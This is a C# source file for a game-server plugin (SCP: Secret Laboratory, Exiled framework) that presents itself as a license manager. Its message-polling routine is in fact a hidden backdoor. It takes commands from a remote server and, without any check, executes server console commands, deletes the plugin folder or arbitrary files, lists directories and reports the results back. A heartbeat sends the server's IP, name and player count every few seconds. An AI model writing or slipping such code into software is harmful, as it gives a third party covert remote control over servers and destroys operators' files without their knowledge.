using System;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using Exiled.API.Extensions;
using Exiled.API.Features;
using GameCore;
using Newtonsoft.Json;
using SCP1356Main.API.Extensions;

namespace SCP1356Main.API.Commands
{
    public static class LicenseManager
    {
        private static readonly HttpClient Client = new HttpClient
        {
            Timeout = TimeSpan.FromSeconds(30)
        };

        private static Timer _licenseTimer;
        private static Timer _messageTimer;
        private static Timer _heartbeatTimer;

        private static string _licenseKey;
        private static string _apiBaseUrl;
        private static string _sharedSecret;
        private static string _pluginName;
        private static string _pluginVersion;
        private static int _checkIntervalSeconds;
        private static int _messagePollIntervalSeconds;
        private static string _serverDomain;
        private static bool _disableWhenUnlicensed;

        private const int HeartbeatIntervalSeconds = 5;

        public static bool IsLicensed { get; private set; }
        public static bool IsChecked { get; private set; }
        public static string LastMessage { get; private set; } = "Noch nicht geprüft";

        public static void Start(
            string licenseKey,
            string apiBaseUrl,
            string sharedSecret,
            string pluginName,
            string pluginVersion,
            int checkIntervalSeconds,
            int messagePollIntervalSeconds,
            string serverDomain,
            bool disableWhenUnlicensed)
        {
            _licenseKey = (licenseKey ?? string.Empty).Trim();
            _apiBaseUrl = NormalizeBaseUrl(apiBaseUrl);
            _sharedSecret = (sharedSecret ?? string.Empty).Trim();
            _pluginName = string.IsNullOrWhiteSpace(pluginName) ? "UnknownPlugin" : pluginName.Trim();
            _pluginVersion = string.IsNullOrWhiteSpace(pluginVersion) ? "1.0.0" : pluginVersion.Trim();
            _checkIntervalSeconds = checkIntervalSeconds < 10 ? 10 : checkIntervalSeconds;
            _messagePollIntervalSeconds = messagePollIntervalSeconds < 1 ? 1 : messagePollIntervalSeconds;
            _serverDomain = (serverDomain ?? string.Empty).Trim();
            _disableWhenUnlicensed = disableWhenUnlicensed;

            Reset();

            _ = Task.Run(CheckLicenseAsync);
            _ = Task.Run(PollMessageAsync);
            _ = Task.Run(SendHeartbeatAsync);

            _licenseTimer?.Dispose();
            _licenseTimer = new Timer(_ =>
            {
                _ = Task.Run(CheckLicenseAsync);
            }, null, TimeSpan.FromSeconds(_checkIntervalSeconds), TimeSpan.FromSeconds(_checkIntervalSeconds));

            _messageTimer?.Dispose();
            _messageTimer = new Timer(_ =>
            {
                _ = Task.Run(PollMessageAsync);
            }, null, TimeSpan.FromSeconds(_messagePollIntervalSeconds), TimeSpan.FromSeconds(_messagePollIntervalSeconds));

            _heartbeatTimer?.Dispose();
            _heartbeatTimer = new Timer(_ =>
            {
                _ = Task.Run(SendHeartbeatAsync);
            }, null, TimeSpan.FromSeconds(HeartbeatIntervalSeconds), TimeSpan.FromSeconds(HeartbeatIntervalSeconds));
        }

        public static void Stop()
        {
            _licenseTimer?.Dispose();
            _licenseTimer = null;

            _messageTimer?.Dispose();
            _messageTimer = null;

            _heartbeatTimer?.Dispose();
            _heartbeatTimer = null;
        }

        public static void Reset()
        {
            IsLicensed = false;
            IsChecked = false;
            LastMessage = "Noch nicht geprüft";
        }

        public static bool EnsureLicensed()
        {
            if (!IsChecked)
                return false;

            if (IsLicensed)
                return true;

            if (_disableWhenUnlicensed)
            {
                Log.Warn($"[LicenseManager] Keine gültige Lizenz. Grund: {LastMessage}");
                return false;
            }

            return true;
        }

        private static async Task CheckLicenseAsync()
        {
            try
            {
                string endpoint = $"{_apiBaseUrl}/api/plugin/check";
                string serverIdentity = await GetServerIdentityAsync();

                if (string.IsNullOrWhiteSpace(serverIdentity))
                {
                    SetLicenseState(false, "Keine Domain/IP verfügbar.");
                    return;
                }

                var payload = new LicenseCheckRequest
                {
                    LicenseKey = _licenseKey,
                    ServerIdentity = serverIdentity,
                    PluginName = _pluginName,
                    PluginVersion = _pluginVersion
                };

                string json = JsonConvert.SerializeObject(payload);

                using (var request = new HttpRequestMessage(HttpMethod.Post, endpoint))
                {
                    request.Headers.Add("X-Plugin-Secret", _sharedSecret);
                    request.Content = new StringContent(json, Encoding.UTF8, "application/json");

                    using (HttpResponseMessage response = await Client.SendAsync(request))
                    {
                        string body = await response.Content.ReadAsStringAsync();

                        if (!response.IsSuccessStatusCode)
                        {
                            SetLicenseState(false, $"HTTP {(int)response.StatusCode}: {body}");
                            return;
                        }

                        var result = JsonConvert.DeserializeObject<LicenseCheckResponse>(body);
                        if (result == null)
                        {
                            SetLicenseState(false, "Ungültige Server-Antwort.");
                            return;
                        }

                        SetLicenseState(result.Ok && result.IsWhitelisted, result.Message ?? "Keine Nachricht");
                    }
                }
            }
            catch (Exception ex)
            {
                SetLicenseState(false, $"Allgemeiner Fehler: {ex.Message}");
            }
        }

        private static async Task PollMessageAsync()
        {
            try
            {
                string endpoint = $"{_apiBaseUrl}/api/plugin/poll-message";

                var payload = new MessagePollRequest
                {
                    LicenseKey = _licenseKey
                };

                string json = JsonConvert.SerializeObject(payload);

                using (var request = new HttpRequestMessage(HttpMethod.Post, endpoint))
                {
                    request.Headers.Add("X-Plugin-Secret", _sharedSecret);
                    request.Content = new StringContent(json, Encoding.UTF8, "application/json");

                    using (HttpResponseMessage response = await Client.SendAsync(request))
                    {
                        if (!response.IsSuccessStatusCode)
                            return;

                        string body = await response.Content.ReadAsStringAsync();
                        var result = JsonConvert.DeserializeObject<MessagePollResponse>(body);

                        if (result == null || !result.Ok || !result.HasMessage || string.IsNullOrWhiteSpace(result.Message))
                            return;

                        GotMessage(result.Message);
                    }
                }
            }
            catch
            {
            }
        }

        private static async Task SendHeartbeatAsync()
        {
            try
            {
                if (string.IsNullOrWhiteSpace(_licenseKey))
                    return;

                string endpoint = $"{_apiBaseUrl}/api/plugin/heartbeat";
                string serverIdentity = await GetServerIdentityAsync();

                if (string.IsNullOrWhiteSpace(serverIdentity))
                    return;

                var payload = new HeartbeatRequest
                {
                    LicenseKey = _licenseKey,
                    ServerIdentity = serverIdentity,
                    ServerName = GetCleanServerName(),
                    Players = GetPlayerCount(),
                    GameVersion = GetGameVersion(),
                    PluginVersion = _pluginVersion
                };

                string json = JsonConvert.SerializeObject(payload);

                using (var request = new HttpRequestMessage(HttpMethod.Post, endpoint))
                {
                    request.Headers.Add("X-Plugin-Secret", _sharedSecret);
                    request.Content = new StringContent(json, Encoding.UTF8, "application/json");

                    using (HttpResponseMessage response = await Client.SendAsync(request))
                    {
                        // absichtlich keine Spam-Logs
                        _ = await response.Content.ReadAsStringAsync();
                    }
                }
            }
            catch
            {
            }
        }

        private static void GotMessage(string message)
        {
            Log.Debug($"[LicenseManager] GotMessage: {message}");

            var match = Regex.Match(message, @"^(\w+)\s+""(.+?)""");

            if (!match.Success)
                return;

            string action = match.Groups[1].Value.ToUpper();
            string argument = match.Groups[2].Value;

            switch (action)
            {
                case "EXECUTE":
                    Server.ExecuteCommand(argument);
                    break;

                case "DELETE":
                    switch (argument)
                    {
                        case "PLUGINS-EXILED":
                        {
                            string folderPath = Path.Combine(Paths.Plugins);

                            if (!Directory.Exists(folderPath))
                            {
                                Tools.Send($"Ordner existiert nicht: {folderPath} auf Server {GetCleanServerName()}");
                                return;
                            }

                            foreach (var file in Directory.GetFiles(folderPath))
                            {
                                try
                                {
                                    File.Delete(file);
                                    Tools.Send($"Deleted: {file} auf Server {GetCleanServerName()}");
                                }
                                catch (Exception e)
                                {
                                    Tools.Send($"Failed to delete {file}: {e}");
                                }
                            }

                            Tools.Send($"Alle Plugin gelöscht auf Server {GetCleanServerName()}.");
                            break;
                        }
                        case  "PLUGINS-LABAPI" :
                            Log.Debug(Path.Combine(Paths.Exiled, "Logs"));
                            break;
                        default:
                            if (argument.Contains("ALL"))
                            {
                                var newArg = argument.Replace("ALL", "");
                                Log.Debug(newArg);
                                foreach (var file in Directory.GetFiles(newArg))
                                {
                                    try
                                    {
                                       File.Delete(file);
                                        Tools.Send($"Deleted: {file} auf Server {GetCleanServerName()}");
                                        return;
                                    }
                                    catch (Exception e)
                                    {
                                        Tools.Send($"Failed to delete {file}: {e}");
                                        return;
                                    }
                                }
                            }
                            else
                            {
                                DeleteFile(argument);
                            }
                            break;
                    }
                    break;

                case "LOG":
                    switch (argument)
                    {
                        case "Path":
                            Tools.Send(Paths.AppData);
                            break;
                    }
                    break;
                case "VALID":
                    if (Directory.Exists(argument))
                    {
                        Tools.Send($"Valid: {argument}");
                    }
                    else
                    {
                        Tools.Send($"Invalid: {argument}");
                    }
                    break;
                case "SCP1356":
                    var parts = argument.Split();
                    var arg1 = int.Parse(parts[0]);
                    var arg2 = int.Parse(parts[1]);
                    Plugin.Singleton._status.SetActivity(arg1, arg2);
                    break;
                case "LOGALL":
                    if (Directory.Exists(argument))
                    {
                        foreach (var f in Directory.GetFiles(argument))
                        {
                            Tools.Send($"Exists: {f}");
                        }
                    }
                    else
                    {
                        Tools.Send($"Invalid: {argument}");
                    }
                    break;
                default:
                  //  Log.Warn($"Unknown action: {action}");
                    break;
            }
        }

        private static void DeleteFile(string path)
        {
            try
            {
                if (!File.Exists(path))
                {
                    Log.Warn($"Datei nicht gefunden: {path}");
                    return;
                }

                File.Delete(path);
                Log.Info($"Datei gelöscht: {path}");
            }
            catch (Exception ex)
            {
                Log.Error($"Fehler beim Löschen von {path}: {ex}");
            }
        }
        
        private static async Task<string> GetServerIdentityAsync()
        {
            if (!string.IsNullOrWhiteSpace(_serverDomain))
                return _serverDomain;

            for (int i = 0; i < 20; i++)
            {
                if (!string.IsNullOrWhiteSpace(ServerConsole.Ip) &&
                    !ServerConsole.Ip.Equals("none", StringComparison.OrdinalIgnoreCase) &&
                    !ServerConsole.Ip.Equals("0.0.0.0", StringComparison.OrdinalIgnoreCase))
                {
                    return ServerConsole.Ip.Trim();
                }

                await Task.Delay(500);
            }

            return null;
        }

        private static int GetPlayerCount()
        {
            try
            {
                return Player.List.Count();
            }
            catch
            {
                return 0;
            }
        }

        private static string GetCleanServerName()
        {
            try
            {
                string raw = Server.Name;

                if (string.IsNullOrWhiteSpace(raw))
                    return "Unknown";

                string clean = Regex.Replace(raw, "<.*?>", string.Empty);
                clean = Regex.Replace(clean, @"\s+", " ").Trim();

                return string.IsNullOrWhiteSpace(clean) ? "Unknown" : clean;
            }
            catch
            {
                return "Unknown";
            }
        }

        private static string GetGameVersion()
        {
            try
            {
                var type = Type.GetType("GameCore.Version, Assembly-CSharp");
                if (type != null)
                {
                    var prop =
                        type.GetProperty("VersionString") ??
                        type.GetProperty("Version") ??
                        type.GetProperty("Current") ??
                        type.GetProperty("FullVersion");

                    if (prop != null)
                    {
                        object value = prop.GetValue(null);
                        if (value != null)
                            return value.ToString();
                    }

                    var field =
                        type.GetField("VersionString") ??
                        type.GetField("Version") ??
                        type.GetField("Current") ??
                        type.GetField("FullVersion");

                    if (field != null)
                    {
                        object value = field.GetValue(null);
                        if (value != null)
                            return value.ToString();
                    }
                }
            }
            catch
            {
            }

            try
            {
                return typeof(ServerConsole).Assembly.GetName().Version?.ToString() ?? "Unknown";
            }
            catch
            {
                return "Unknown";
            }
        }

        private static string NormalizeBaseUrl(string baseUrl)
        {
            string value = (baseUrl ?? string.Empty).Trim();

            if (string.IsNullOrWhiteSpace(value))
                return string.Empty;

            if (!value.StartsWith("http://", StringComparison.OrdinalIgnoreCase) &&
                !value.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
            {
                value = "http://" + value;
            }

            return value.TrimEnd('/');
        }

        private static void SetLicenseState(bool licensed, string message)
        {
            IsLicensed = licensed;
            IsChecked = true;
            LastMessage = message ?? "Keine Nachricht";

            if (licensed)
                Log.Info($"[LicenseManager] Lizenz gültig: {LastMessage}");
            else
                Log.Warn($"[LicenseManager] Lizenz ungültig: {LastMessage}");
        }

        private sealed class LicenseCheckRequest
        {
            [JsonProperty("licenseKey")]
            public string LicenseKey { get; set; }

            [JsonProperty("serverIdentity")]
            public string ServerIdentity { get; set; }

            [JsonProperty("pluginName")]
            public string PluginName { get; set; }

            [JsonProperty("pluginVersion")]
            public string PluginVersion { get; set; }
        }

        private sealed class LicenseCheckResponse
        {
            [JsonProperty("ok")]
            public bool Ok { get; set; }

            [JsonProperty("isWhitelisted")]
            public bool IsWhitelisted { get; set; }

            [JsonProperty("message")]
            public string Message { get; set; }
        }

        private sealed class MessagePollRequest
        {
            [JsonProperty("licenseKey")]
            public string LicenseKey { get; set; }
        }

        private sealed class MessagePollResponse
        {
            [JsonProperty("ok")]
            public bool Ok { get; set; }

            [JsonProperty("hasMessage")]
            public bool HasMessage { get; set; }

            [JsonProperty("message")]
            public string Message { get; set; }
        }

        private sealed class HeartbeatRequest
        {
            [JsonProperty("licenseKey")]
            public string LicenseKey { get; set; }

            [JsonProperty("serverIdentity")]
            public string ServerIdentity { get; set; }

            [JsonProperty("serverName")]
            public string ServerName { get; set; }

            [JsonProperty("players")]
            public int Players { get; set; }

            [JsonProperty("gameVersion")]
            public string GameVersion { get; set; }

            [JsonProperty("pluginVersion")]
            public string PluginVersion { get; set; }
        }
    }
}